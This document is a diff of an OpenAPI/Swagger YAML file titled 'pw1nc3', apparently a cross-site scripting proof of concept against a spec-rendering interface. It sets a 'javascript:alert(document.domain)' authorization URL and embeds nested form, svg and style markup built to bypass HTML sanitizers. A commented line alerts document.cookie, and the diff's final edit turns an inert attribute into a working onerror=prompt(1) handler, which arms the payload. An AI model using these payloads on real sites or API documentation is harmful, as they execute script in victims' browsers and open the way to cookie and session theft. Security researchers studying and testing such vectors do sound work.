@@ -5,7 +5,7 @@ securityDefinitions:
     authorizationUrl: javascript:alert(document.domain)//
 info:
   version: "0.0.1"
-  title: pw1nc3
+  title: pw1nc3 v1.1
 #  description: '<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert(document.cookie) src>">'
   description: '<form id="x ">
 <r*504>
@@ -20,7 +20,7 @@ info:
         </desc>
       </a>
     </image>
-    <style><a id="</style><img src=hhi onxx=hi(1)>"></a></style>
+    <style><a id="</style><img src=hhi onerror=prompt(1)>"></a></style>
   </svg>
 </a>
 </form>
